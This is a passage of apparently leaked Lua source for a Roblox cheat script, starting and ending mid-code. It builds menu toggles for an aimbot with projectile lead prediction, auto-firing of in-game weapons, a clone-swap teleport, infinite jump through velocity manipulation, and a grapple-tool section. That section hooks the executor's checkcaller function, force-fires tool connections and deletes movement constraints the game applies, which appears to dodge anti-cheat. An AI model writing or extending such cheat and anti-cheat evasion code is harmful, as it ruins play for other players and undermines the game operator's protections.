					child.Parent = backpack
				end
			end

			if instance27.Parent ~= character_ then
				humanoid:EquipTool(instance27)
			end

			local now = os.clock()

			while instance27.Parent ~= character_ and os.clock() - now < 0.5 do
				RunService.Heartbeat:Wait()
			end

			return instance27.Parent == character_
		end

		local function func174(instance28, param56)
			if not instance28 or not instance28.Parent then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			if not character_ or not humanoid or humanoid.Health <= 0 or instance28.Parent ~= character_ and instance28.Parent ~= backpack then
				return
			end
			local tool = character_:FindFirstChildWhichIsA("Tool")
			if tool == instance28 then
				return
			end

			if tool and tool ~= param56 then
				return
			end

			pcall(function()
				func3(0.5)
				humanoid:EquipTool(instance28)
			end)
		end

		local function func175(instance29, num18, num19)
			local magnitude = (num18 - num19).Magnitude
			local now = os.clock()

			repeat
				local n8 = os.clock() - now
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
				local humanoidRootPart = instance29 and instance29.Parent and instance29:FindFirstChild("HumanoidRootPart")
				if n8 >= n5 and character_ and (character_.Position - num19).Magnitude <= n7 and (not instance29 or not instance29.Parent or humanoidRootPart and (humanoidRootPart.Position - num18).Magnitude <= n7) then
					return true
				end

				if magnitude <= n7 and n8 >= n6 then
					return true
				end
				RunService.Heartbeat:Wait()
			until os.clock() - now >= n4

			return false
		end

		local function func176()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local toolsFrames = playerGui and playerGui:FindFirstChild("ToolsFrames")
			toolsFrames = toolsFrames and toolsFrames:FindFirstChild("QuantumCloner")
			local teleportToClone = toolsFrames and toolsFrames:FindFirstChild("TeleportToClone")
			if not teleportToClone then
				return nil
			end

			local ok, result = pcall(function()
				return getconnections(teleportToClone.MouseButton1Up)
			end)

			if not ok or type(result) ~= "table" then
				return nil
			end

			for _, item38 in ipairs(result) do
				local function_ = item38.Function
				function_ = function_ and debug.getinfo(function_) or nil
				function_ = function_ and function_.source or ""
				if item38.Enabled and type(item38.Fire) == "function" and string.find(function_, "QuantumClonerScript", 1, true) then
					return item38
				end
			end
		end

		obj15:CreateButton({
			Name = "Instant Clone Swap",
			ButtonText = "Swap",
			Callback = function()
				if flag130 then
					return false
				end
				flag130 = true
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChildWhichIsA("Tool")
				local quantumCloner = func172()

				if not quantumCloner then
					local value154
					quantumCloner, v12 = func119("Quantum Cloner")

					if not quantumCloner then
						func120("Quantum Cloner", value154)
						flag130 = false
						return false
					end
				end

				if character_ == quantumCloner then
					character_ = nil
				end

				if not quantumCloner or not quantumCloner:IsA("Tool") or not func173(quantumCloner) then
					func174(character_, quantumCloner)
					flag130 = false
					return false
				end

				local result13 = func176()

				if not result13 then
					func174(character_, quantumCloner)
					flag130 = false
					return false
				end

				local userId = tostring(localPlayer.UserId) .. "_Clone"
				local value155 = Workspace:FindFirstChild(userId)
				local value156 = nil
				local now = os.clock()

				local connection = Workspace.ChildAdded:Connect(function(child)
					if child.Name == userId and child ~= value155 then
						value156 = child
					end
				end)

				local ok

				while true do
					if not value156 then
						pcall(function()
							quantumCloner:Activate()
						end)

						local flag131 = Workspace:FindFirstChild(userId)

						if flag131 and flag131 ~= value155 then
							value156 = flag131
						end
					end

					local humanoidRootPart = value156 and value156:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						local humanoidRootPart2 = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
						humanoidRootPart2 = humanoidRootPart2 and humanoidRootPart2.Position
						local position = humanoidRootPart.Position

						ok = pcall(function()
							result13:Fire()
						end)

						if ok and humanoidRootPart2 then
							func175(value156, humanoidRootPart2, position)
						end

						break
					else
						RunService.Heartbeat:Wait()
						ok = false
						if not (os.clock() - now >= n3) then
							continue
						end
					end

					break
				end

				connection:Disconnect()
				func174(character_, quantumCloner)
				flag130 = false
				return ok
			end,
		})
	end

	do
		local n3 = 0.05
		local n4 = 0.05
		local n5 = 200

		local tbl40 = {
			["Web Slinger"] = true,
			["Taser Gun"] = true,
			["Laser Cape"] = true,
			["Paintball Gun"] = true,
		}

		local PlayerMouse = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("PlayerMouse"))
		local flag132 = false
		local flag133 = false
		local n6 = 0
		local flag134 = false
		local n7 = 0
		local flag135 = false
		local hit = nil
		local target = nil
		local value157 = nil
		local n8 = 0
		local n9 = 0
		local n10 = 0
		local obj2 = setmetatable({}, { __mode = "k" })
		local connection = nil

		local function func177()
			if flag135 then
				return
			end
			flag135 = true
			hit = PlayerMouse.Hit
			target = PlayerMouse.Target
		end

		local function func178(player3)
			local character_ = player3.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

			if character_ then
				character_ = character_:FindFirstChild("HumanoidRootPart") or character_:FindFirstChild("UpperTorso") or character_:FindFirstChild("Torso")
			end

			if humanoid and humanoid.Health > 0 and character_ then
				return humanoid, character_
			end
		end

		local function func179()
			local character_ = localPlayer.Character
			if not character_ then
				return nil
			end

			for k in pairs(tbl40) do
				local obj42 = character_:FindFirstChild(k)
				if obj42 and obj42:IsA("Tool") then
					return obj42
				end
			end
		end

		local function func180()
			local value158, num20 = func178(localPlayer)
			if not num20 then
				return nil
			end
			local value159 = nil
			local value160 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local value161, value162 = func178(player)

					if value162 then
						local magnitude = (value162.Position - num20.Position).Magnitude

						if not value159 or magnitude < value159 then
							value159 = magnitude
							value160 = value162
						end
					end
				end
			end

			return value160
		end

		local function func181(flag136)
			local now = os.clock()

			if flag136 or not value157 or not value157.Parent or now - n8 >= n3 then
				n8 = now
				value157 = func180()
			end

			return value157
		end

		local function func182(instance30)
			local muzzle = obj2[instance30]

			if not muzzle or not muzzle.Parent then
				muzzle = instance30:FindFirstChild("Muzzle", true) or instance30:FindFirstChild("FirePoint", true) or instance30:FindFirstChild("Handle")
				obj2[instance30] = muzzle
			end

			if muzzle then
				if muzzle:IsA("Attachment") then
					return muzzle.WorldPosition
				end

				if muzzle:IsA("BasePart") then
					return muzzle.Position
				end
			end

			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			return character_ and character_.Position
		end

		local function func183()
			local now = os.clock()
			if now < n10 then
				return n9
			end
			n10 = now + 0.5

			local ok, result = pcall(function()
				return localPlayer:GetNetworkPing()
			end)

			if ok and type(result) == "number" then
				n9 = math.clamp(result, 0, 0.35)
			end

			return n9
		end

		local function func184(obj43, obj44)
			local n11 = n5 * n5
			local n12 = obj44:Dot(obj44) - n11
			local n13 = 2 * obj43:Dot(obj44)
			local num21 = obj43:Dot(obj43)
			local n14

			if math.abs(n12) < 0.0001 then
				n14 = nil

				if math.abs(n13) > 0.0001 then
					n14 = -num21 / n13
					local value163 = nil

					if not (n14 > 0) then
						n14 = value163
					end
				end
			else
				local n15 = n13 * n13 - 4 * n12 * num21
				n14 = nil

				if n15 >= 0 then
					local num22 = math.sqrt(n15)
					local n16 = (-n13 - num22) / 2 * n12
					local n17 = (-n13 + num22) / 2 * n12

					if n16 > 0 and n17 > 0 then
						n14 = math.min(n16, n17)
					elseif n16 > 0 then
						n14 = n16
					else
						n14 = nil

						if n17 > 0 then
							n14 = n17
						end
					end
				end
			end

			return math.clamp(n14 or obj43.Magnitude / n5, 0, 3)
		end

		local function func185(param57, part10)
			local num23 = func182(param57)
			if not num23 then
				return part10.Position
			end
			local assemblyLinearVelocity = part10.AssemblyLinearVelocity
			local n11 = part10.Position + assemblyLinearVelocity * func183()
			return n11 + assemblyLinearVelocity * func184(n11 - num23, assemblyLinearVelocity)
		end

		local function func186(param58)
			local result14 = func179()
			if not flag132 and not flag133 and not flag134 or not result14 then
				return false
			end
			local num24 = func181(param58)
			if not num24 then
				return false
			end
			local n11

			if result14.Name == "Paintball Gun" then
				n11 = func185(result14, num24)
			else
				n11 = num24.Position + num24.AssemblyLinearVelocity * n4
			end

			PlayerMouse.Hit = CFrame.new(n11)
			PlayerMouse.Target = num24
			return true
		end

		local function func187()
			if not flag135 then
				return
			end
			flag135 = false
			value157 = nil
			n8 = 0
			PlayerMouse.Hit = hit
			PlayerMouse.Target = target
			hit = nil
			target = nil
		end

		local function func188()
			flag132 = false
			ContextActionService:UnbindAction("ChilliToolAimbotAction")

			pcall(function()
				RunService:UnbindFromRenderStep("ChilliToolAimbotRender")
			end)

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if not flag133 and not flag134 then
				func187()
			end
		end

		local function func189()
			func188()
			flag132 = true

			ContextActionService:BindActionAtPriority("ChilliToolAimbotAction", function(param59, flag137)
				if flag137 == Enum.UserInputState.Begin and func179() then
					func186(true)
				end

				return Enum.ContextActionResult.Pass
			end, false, 10000, Enum.UserInputType.MouseButton1, Enum.UserInputType.Touch)

			connection = UserInputService.InputBegan:Connect(function(input)
				local userInputType = input.UserInputType

				if userInputType == Enum.UserInputType.MouseButton1 or userInputType == Enum.UserInputType.Touch then
					func186(true)
				end
			end)

			RunService:BindToRenderStep("ChilliToolAimbotRender", Enum.RenderPriority.Last.Value + 20, function()
				if func179() then
					func177()
					func186(false)
				elseif not flag133 and not flag134 then
					func187()
				end
			end)
		end

		local function func190()
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("Paintball Gun")
			return character_ and character_:IsA("Tool") and character_ or nil
		end

		local function func191()
			flag133 = false
			n6 += 1
			local result15 = func190()

			if result15 then
				pcall(function()
					result15:Deactivate()
				end)
			end

			if not flag132 and not flag134 then
				func187()
			end
		end

		local function func192()
			func191()
			local paintballGun, value164 = func119("Paintball Gun")

			if not paintballGun then
				func120("Paintball Gun", value164)
			end

			flag133 = true
			n6 += 1
			local flag138 = n6

			task.spawn(function()
				while flag133 and flag138 == n6 and flag1 do
					local result16 = func190()

					if result16 then
						func177()

						if func186(false) then
							pcall(function()
								result16:Activate()
							end)
						end
					elseif not flag132 and not flag134 then
						func187()
					end

					task.wait(0.04)
				end
			end)

			return true
		end

		local function func193()
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("Laser Cape")
			return character_ and character_:IsA("Tool") and character_ or nil
		end

		local function func194()
			flag134 = false
			n7 += 1
			local result17 = func193()

			if result17 then
				pcall(function()
					result17:Deactivate()
				end)
			end

			if not flag132 and not flag133 then
				func187()
			end
		end

		local function func195()
			func194()
			local laserCape, value165 = func119("Laser Cape")

			if not laserCape then
				func120("Laser Cape", value165)
			end

			flag134 = true
			n7 += 1
			local flag139 = n7

			task.spawn(function()
				while flag134 and flag139 == n7 and flag1 do
					local result18 = func193()

					if result18 then
						func177()

						if func186(false) then
							pcall(function()
								result18:Activate()
							end)
						end
					elseif not flag132 and not flag133 then
						func187()
					end

					task.wait(0.04)
				end
			end)

			return true
		end

		func2(function()
			func194()
			func191()
			func188()
		end)

		obj16:CreateToggle({
			Name = "Aimbot",
			Default = true,
			Callback = function(value)
				if value then
					func189()
				else
					func188()
				end
			end,
		})

		obj16:CreateToggle({
			Name = "Auto Paintball",
			Note = "Automatically uses the Paintball Gun while equipped.",
			Default = true,
			Callback = function(value)
				if value then
					func192()
				else
					func191()
				end
			end,
		})

		obj16:CreateToggle({
			Name = "Auto Laser Cape",
			Note = "Automatically uses the Laser Cape while equipped.",
			Default = false,
			Callback = function(value)
				if value then
					func195()
				else
					func194()
				end
			end,
		})
	end

	local obj45
	obj45 = obj14:CreateSection({ Name = "Speed Boost" })
	local obj46
	obj46 = obj14:CreateSection({ Name = "Jump Boost" })
	obj11 = obj14:CreateSection({ Name = "Character" })
	obj12 = obj14:CreateSection({ Name = "Invisibility" })
	obj13 = obj14:CreateSection({ Name = "Respawn", Expanded = false })

	do
		local n3 = 0.0083333333333333332
		local n4 = 4
		local n5 = 0.12
		local n6 = 25
		local n7 = 0.045
		local n8 = 0.03
		local n9 = 0.015
		local n10 = 10
		local n11 = 60
		local flag140 = false
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local connection4 = nil
		local connection5 = nil
		local flag141 = false
		local humanoid = nil
		local humanoidRootPart = nil
		local flag142 = false
		local flag143 = false
		local n12 = 0
		local n13 = 0
		local n14 = 0
		local n15 = 0
		local n16 = 0
		local n17 = 60
		local n18 = 19.1
		local flag144 = false
		local y = nil

		local function func196()
			return math.max(n17 / n11, 0.01)
		end

		local function func197()
			if not flag140 or not humanoidRootPart or not humanoidRootPart.Parent then
				return
			end

			if UserInputService:GetFocusedTextBox() then
				return
			end
			y = y or humanoidRootPart.Position.Y
			if flag144 and humanoidRootPart.Position.Y - y >= n18 then
				return
			end
			local result19 = func196()
			n13 = n11 * result19
			local n19 = n5 / result19
			n12 = os.clock() + n19
			flag143 = true
			n15 = os.clock()
		end

		local function func198()
			if not humanoid or not humanoidRootPart or not humanoidRootPart.Parent then
				return
			end

			if humanoid.Health <= 0 then
				flag142 = false
				flag143 = false
				return
			end

			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local floorMaterial = humanoid.FloorMaterial ~= Enum.Material.Air
			local now = os.clock()
			local result20 = func196()

			if floorMaterial then
				y = humanoidRootPart.Position.Y
			end

			local flag145 = flag144 and (flag142 or flag143) and y and humanoidRootPart.Position.Y - y >= n18

			if flag142 and not flag145 then
				if now - n15 >= n7 / result20 or flag143 and n12 - now <= n8 / result20 then
					func197()
				end
			end

			if flag145 then
				flag143 = false

				if assemblyLinearVelocity.Y > 0 then
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
				end
			elseif flag143 then
				if n12 <= now then
					flag143 = false
				else
					local n19 = (Workspace.Gravity * result20 * result20 - Workspace.Gravity) * n3
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y + (n13 - assemblyLinearVelocity.Y) * (1 - math.exp(-n6 * result20 * n3)) - n19, assemblyLinearVelocity.Z)
				end
			elseif not floorMaterial then
				local gravity = Workspace.Gravity

				if assemblyLinearVelocity.Y < 0 then
					gravity += n10
				end

				local n19 = gravity * result20 * result20 - Workspace.Gravity

				if math.abs(n19) > 0.001 then
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y - n19 * n3, assemblyLinearVelocity.Z)
				end
			end
		end

		local function func199(deltaTime)
			if not flag140 or not flag1 then
				return
			end
			n16 += deltaTime
			if n16 < n3 then
				return
			end
			local n19 = math.floor(n16 / n3)

			if n4 < n19 then
				n16 = 0
				n19 = 4
			else
				n16 -= n19 * n3
			end

			for i_ = 1, n19 do
				func198()
			end
		end

		local function func200(param60, flag146)
			if not flag140 then
				return Enum.ContextActionResult.Pass
			end

			if flag146 == Enum.UserInputState.Begin then
				local now = os.clock()

				if n9 <= now - n14 then
					n14 = now
					flag142 = true
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
					func197()
				end
			elseif flag146 == Enum.UserInputState.End or flag146 == Enum.UserInputState.Cancel then
				flag142 = false
			end

			return Enum.ContextActionResult.Pass
		end

		local function func201()
			if flag141 then
				ContextActionService:UnbindAction("ChilliInfinityJump2")
				flag141 = false
			end
		end

		local function func202()
			func201()
			ContextActionService:BindAction("ChilliInfinityJump2", func200, false, Enum.KeyCode.Space, Enum.KeyCode.ButtonA)
			flag141 = true
		end

		local function func203(param61)
			if connection3 then
				connection3:Disconnect()
			end

			if connection4 then
				connection4:Disconnect()
			end

			connection3 = param61.InputBegan:Connect(function(input)
				if not flag140 or input.UserInputType ~= Enum.UserInputType.Touch then
					return
				end
				local now = os.clock()

				if now - n14 >= n9 then
					n14 = now
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
					func197()
				end

				flag142 = true
			end)

			connection4 = param61.InputEnded:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.Touch then
					return
				end
				flag142 = false
			end)
		end

		local function func204()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end
		end

		local function func205(instance31)
			return (instance31:IsA("ImageButton") or instance31:IsA("TextButton")) and instance31.Name:lower():find("jump", 1, true) ~= nil
		end

		local function func206()
			func204()
			if not UserInputService.TouchEnabled then
				return
			end
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			if not playerGui then
				return
			end
			local touchGui = playerGui:FindFirstChild("TouchGui", true)

			if touchGui then
				for _, descendant in ipairs(touchGui:GetDescendants()) do
					if func205(descendant) then
						func203(descendant)
						break
					end
				end
			end

			connection5 = playerGui.DescendantAdded:Connect(function(descendant)
				if flag140 and func205(descendant) then
					func203(descendant)
				end
			end)
		end

		local function func207(instance32)
			humanoid = instance32:FindFirstChildOfClass("Humanoid") or instance32:WaitForChild("Humanoid", 5)
			humanoidRootPart = instance32:FindFirstChild("HumanoidRootPart") or instance32:WaitForChild("HumanoidRootPart", 5)
			flag142 = false
			flag143 = false
			y = humanoidRootPart and humanoidRootPart.Position.Y or nil
			n16 = 0
		end

		local function func208()
			flag140 = false
			flag142 = false
			flag143 = false

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end
			-- SL | SOURCE LEAK | https://discord.gg/x7YbZeezpm

			func201()
			func204()
			humanoid = nil
			humanoidRootPart = nil
		end

		local function func209()
			func208()
			flag140 = true

			if localPlayer.Character then
				func207(localPlayer.Character)
			end

			connection2 = localPlayer.CharacterAdded:Connect(function(character_)
				if flag140 then
					func207(character_)
				end
			end)

			func202()
			func206()
			connection = RunService.Heartbeat:Connect(func199)
		end

		func2(func208)

		obj46:CreateSlider({
			Name = "Jump Speed",
			ShowWhen = obj46:CreateToggle({
				Name = "Infinity Jump",
				Default = true,
				Callback = function(value)
					if value then
						func209()
					else
						func208()
					end
				end,
			}),
			Min = 20,
			Max = 100,
			Default = 60,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Changes jump timing while preserving the height of the original 60 speed.",
			Callback = function(value)
				n17 = math.clamp(tonumber(value) or 60, 20, 100)
			end,
		})

		obj46:CreateSlider({
			Name = "Jump Height",
			ShowWhen = obj46:CreateToggle({
				Name = "Limit Jump Height",
				Default = false,
				Note = "Limits the height of each jump. Leave this off to keep air jumping upward.",
				Callback = function(value)
					flag144 = value == true
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
				end,
			}),
			Min = 1,
			Max = 21,
			Default = 19.1,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(value)
				n18 = math.clamp(tonumber(value) or 19.1, 1, 21)
			end,
		})
	end

	floatSpeedToolBridge = {}
	local n3
	n3 = 0.3
	local n4
	n4 = 200
	local n5
	n5 = 0.05
	local n6
	n6 = 0.02
	local n7
	n7 = 0.5
	local n8
	n8 = 0.5
	local n9
	n9 = 2
	local n10
	n10 = 14
	local n11
	n11 = 2
	local n12
	n12 = 19.1
	local n13
	n13 = 0.2
	local n14
	n14 = 0
	local n15
	n15 = 0.52
	local n16
	n16 = 52
	local n17
	n17 = 28
	local n18
	n18 = 240
	local n19
	n19 = 185
	local flag147
	flag147 = false
	local flag148
	flag148 = true
	local flag149
	flag149 = true
	local flag150
	flag150 = false
	local n20
	n20 = n17 - n8
	local n21
	n21 = 1
	local flag151
	flag151 = "Bottom"
	local now
	now = os.clock()
	local num25
	num25 = nil
	local flag152
	flag152 = nil
	local y
	y = nil
	local now2
	now2 = os.clock()
	local n22
	n22 = 0
	local flag153
	flag153 = "Grapple Hook"
	local flag154, n23, obj47, obj48, flag155, flag156, obj49, obj50, flag157, flag158
	local connection, connection2, connection3, connection4, connection5, flag159, flag160, n24, func210

	do
		local n25 = 0.8
		flag154 = nil
		n23 = 0
		local flag161 = false
		obj47 = nil
		obj48 = nil
		flag155 = false
		flag156 = localPlayer:GetAttribute("Stealing") == true
		obj49 = nil
		obj50 = nil
		flag157 = false
		flag158 = false
		local connection6 = nil
		local value166 = nil
		connection = nil
		connection2 = nil
		connection3 = nil
		connection4 = nil
		connection5 = nil
		local connection7 = nil
		local flag162 = false
		flag159 = false
		flag160 = false
		n24 = 0
		local flag163 = false
		local value167 = nil
		local tbl41 = {}
		local tbl42 = {}
		local value168 = nil
		local connection8 = nil
		local raycastParams = RaycastParams.new()
		local value169 = nil
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		raycastParams.IgnoreWater = true

		pcall(function()
			raycastParams.RespectCanCollide = true
		end)

		local function func211()
			local character_ = localPlayer.Character
			if not character_ then
				return nil, nil
			end
			local findFirstChildOfClass = character_.FindFirstChildOfClass
			return character_:FindFirstChild("HumanoidRootPart"), findFirstChildOfClass(character_, "Humanoid")
		end

		func210 = function(instance33)
			return instance33 and instance33:IsA("Tool")
		end

		local function func212()
			local byName2 = {}
			local items = ReplicatedStorage:FindFirstChild("Items")

			if items then
				for _, child in ipairs(items:GetChildren()) do
					if child:IsA("Tool") and child:GetAttribute("IgnoreAntiCheat") == true then
						byName2[child.Name] = true
					end
				end
			end

			local list28 = {}

			for k in pairs(byName2) do
				if k ~= flag153 and func210(func118(k)) then
					list28[#list28 + 1] = k
				end
			end

			table.sort(list28, function(param62, param63)
				return string.lower(param62) < string.lower(param63)
			end)

			list28[#list28 + 1] = flag153
			return list28, list28[1] or "Grapple Hook"
		end

		local value170, str20 = func212()
		local num26 = str20 == flag153 and n18 or n19

		local function func213()
			local flag164 = str20 == flag153
			local n26 = flag164 and 270 or 210
			num26 = math.clamp(flag164 and n18 or n19, 50, n26)

			if obj50 then
				obj50:SetRange(50, n26, false)
				obj50:Set(num26, false)
			end
		end

		local function func214()
			value168 = nil

			if connection8 then
				connection8:Disconnect()
				connection8 = nil
			end

			for k, value171 in pairs(tbl41) do
				pcall(function()
					k.Attachment0 = value171.Attachment0
					k.Attachment1 = value171.Attachment1
					k.Enabled = value171.Enabled
				end)
			end

			table.clear(tbl41)

			for k, value172 in pairs(tbl42) do
				pcall(function()
					k.Volume = value172
				end)
			end

			table.clear(tbl42)
		end

		local function func215(instance34)
			if value168 == instance34 then
				return
			end
			func214()
			value168 = instance34
			local handle = instance34:FindFirstChild("Handle")
			local beam = handle and handle:FindFirstChild("Beam")

			if beam and beam:IsA("Beam") then
				tbl41[beam] = { Enabled = beam.Enabled, Attachment0 = beam.Attachment0, Attachment1 = beam.Attachment1 }
				beam.Enabled = false
				beam.Attachment0 = nil

				connection8 = beam:GetPropertyChangedSignal("Enabled"):Connect(function()
					if value168 == instance34 and beam.Enabled then
						beam.Enabled = false
					end
				end)
			end

			for _, descendant in ipairs(instance34:GetDescendants()) do
				if descendant:IsA("Sound") then
					tbl42[descendant] = descendant.Volume
					descendant.Volume = 0
				end
			end
		end

		local function func216()
			if type(hookfunction) ~= "function" or type(checkcaller) ~= "function" or type(newcclosure) ~= "function" then
				return false
			end

			if value167 then
				flag163 = true
				local flag165 = false

				pcall(function()
					flag165 = checkcaller() == false
				end)

				flag163 = false
				if flag165 then
					return true
				end
				value167 = nil
			end

			return pcall(function()
				value167 = hookfunction(checkcaller, newcclosure(function()
					if flag163 then
						return false
					end
					return value167()
				end))
			end) and value167 ~= nil
		end

		local function func217(instance35)
			if not instance35 or instance35.Parent ~= localPlayer.Character then
				return
			end
			flag163 = true

			pcall(function()
				instance35:Deactivate()
				instance35:Activate()
			end)

			if type(firesignal) == "function" then
				pcall(function()
					firesignal(instance35.Activated)
				end)
			end

			if type(getconnections) == "function" then
				pcall(function()
					local activated = getconnections(instance35.Activated)

					if type(activated) == "table" then
						for _, item39 in ipairs(activated) do
							if item39.Enabled then
								if type(item39.Fire) == "function" then
									item39:Fire()
								elseif type(item39.Function) == "function" then
									item39.Function()
								end
							end
						end
					end
				end)
			end

			flag163 = false
		end

		local function func218(instance36)
			if not (flag159 or flag160) or not instance36 or instance36.Parent ~= localPlayer.Character or instance36:GetAttribute("CooldownTime") ~= nil then
				return
			end
			n24 = os.clock() + n25
			func217(instance36)
		end

		local function func219()
			value166 = nil

			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end
		end

		local function func220(obj51)
			if value166 == obj51 then
				return
			end
			func219()
			value166 = obj51

			connection6 = obj51:GetAttributeChangedSignal("CooldownTime"):Connect(function()
				if (flag159 or flag160) and obj51:GetAttribute("CooldownTime") == nil then
					func218(obj51)
				end
			end)
		end

		local function func221()
			if not flag158 then
				return
			end
			flag158 = false
			local flag166, num27 = func211()
			if not flag166 or not num27 or num27.Health <= 0 then
				return
			end
			local assemblyLinearVelocity = flag166.AssemblyLinearVelocity
			local moveDirection = num27.MoveDirection
			local vector = Vector3.zero

			if moveDirection.Magnitude > 0.001 then
				vector = moveDirection.Unit * num27.WalkSpeed
			end

			flag166.AssemblyLinearVelocity = Vector3.new(vector.X, assemblyLinearVelocity.Y, vector.Z)
		end

		local function func222()
			func221()
			flag150 = false
			flag157 = false
			flag159 = false
			flag154 = nil

			if not flag160 then
				n24 = 0
				func219()
				func214()
			end
		end

		local function func223()
			func222()

			if obj47 then
				obj47:Set(false, true)
			end
		end

		local function func224()
			if flag161 then
				return
			end
			flag161 = true

			task.defer(function()
				flag161 = false
				func223()
			end)
		end

		local function func225(flag167, flag168)
			if flag167 == flag153 and flag168 == "rebirth" then
				obj1.Notify("Tool unavailable", "Grapple Hook requires 3 Rebirths.", 5)
				return
			end
			func120(flag167, flag168)
		end

		local function func226(instance37)
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or humanoid.Health <= 0 or not func210(instance37) then
				return nil
			end
			n23 = os.clock() + 1.5
			if instance37.Parent == character_ then
				return instance37
			end

			if not (character_:FindFirstChild("RightHand") or character_:FindFirstChild("Right Arm")) then
				if not character_:WaitForChild("RightHand", 1.5) then
					character_:WaitForChild("Right Arm", 1.5)
				end
			end

			pcall(function()
				humanoid:EquipTool(instance37)
			end)

			local now3 = os.clock()

			while os.clock() - now3 < 0.6 do
				if instance37.Parent ~= character_ then
					RunService.Heartbeat:Wait()
					continue
				end
				break
			end

			if instance37.Parent ~= character_ and humanoid.Health > 0 then
				pcall(function()
					humanoid:EquipTool(instance37)
				end)

				local now4 = os.clock()

				while os.clock() - now4 < 0.6 do
					if instance37.Parent ~= character_ then
						RunService.Heartbeat:Wait()
						continue
					end
					break
				end
			end

			if instance37.Parent ~= character_ then
				pcall(function()
					instance37.Parent = character_
				end)
			end

			if instance37.Parent == character_ then
				RunService.Heartbeat:Wait()
				return instance37
			end
			local flag169 = character_:FindFirstChild(str20)
			return func210(flag169) and flag169 or nil
		end

		local function func227()
			local grappleHook = func118(str20)

			if not func210(grappleHook) and str20 == flag153 then
				local value173
				grappleHook, value173 = func119("Grapple Hook")
				if not func210(grappleHook) then
					func225("Grapple Hook", value173)
					return false
				end
			elseif not func210(grappleHook) then
				obj1.Notify("Tool unavailable", str20 .. " is not currently owned.", 5)
				return false
			end

			flag154 = func226(grappleHook)
			if not flag154 then
				obj1.Notify("Tool unavailable", "Unable to equip " .. str20 .. " right now.", 5)
				return false
			end
			flag150 = true
			flag157 = true

			if str20 == flag153 then
				func216()
				flag159 = true
				func215(flag154)
				func220(flag154)
				func218(flag154)
			end

			return true
		end

		local function func228()
			local value174, value175 = func212()
			local value176, value177, value178 = ipairs(value174)
			local flag170 = false

			for _, value179 in value176, value177, value178 do
				if value179 == str20 then
					flag170 = true
					break
				end
			end

			if not flag170 then
				str20 = value175

				if flag150 then
					func224()
				end
			end

			func213()

			if obj49 then
				obj49:SetOptions(value174, str20, false)
			end
		end

		local function func229()
			if flag162 then
				return
			end
			flag162 = true

			task.defer(function()
				flag162 = false
				func228()
			end)
		end

		local function func230(obj52)
			if connection then
				connection:Disconnect()
			end

			if connection2 then
				connection2:Disconnect()
			end

			if connection3 then
				connection3:Disconnect()
			end

			connection = obj52.DescendantAdded:Connect(function(descendant)
				if not (flag159 or flag160) or os.clock() > n24 then
					return
				end

				if not (descendant:IsA("BodyMover") or descendant:IsA("Constraint")) then
					return
				end

				task.defer(function()
					if descendant.Parent then
						pcall(function()
							descendant:Destroy()
						end)
					end
				end)
			end)

			connection2 = obj52.ChildAdded:Connect(function(child)
				func229()
				local humanoid = obj52:FindFirstChildOfClass("Humanoid")
				humanoid = humanoid and humanoid.Health > 0
				local value180 = flag150

				if not flag150 then
					humanoid = value180
				end

				if humanoid and child:IsA("Tool") and child.Name ~= str20 and not func121() and os.clock() >= n23 then
					func224()
				end
			end)

			connection3 = obj52.ChildRemoved:Connect(function(child)
				func229()
				local humanoid = obj52:FindFirstChildOfClass("Humanoid")
				humanoid = humanoid and humanoid.Health > 0
				local value181 = flag150

				if not flag150 then
					humanoid = value181
				end

				if humanoid and child == flag154 and not func121() and os.clock() >= n23 then
					task.defer(function()
						local character_ = localPlayer.Character
						local humanoid2 = character_ and character_:FindFirstChildOfClass("Humanoid")
						if not humanoid2 or humanoid2.Health <= 0 then
							return
						end
						character_ = character_ and character_:FindFirstChild(str20)

						if flag150 and not func210(character_) then
							func224()
						end
					end)
				end
			end)
		end

		local function func231(param64)
			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end

			if connection7 then
				connection7:Disconnect()
				connection7 = nil
			end

			if param64 then
				connection4 = param64.ChildAdded:Connect(func229)
				connection5 = param64.ChildRemoved:Connect(func229)
			end
		end

		if localPlayer.Character then
			func230(localPlayer.Character)
		end

		local backpack = localPlayer:FindFirstChildOfClass("Backpack")

		if backpack then
			func231(backpack)
		end

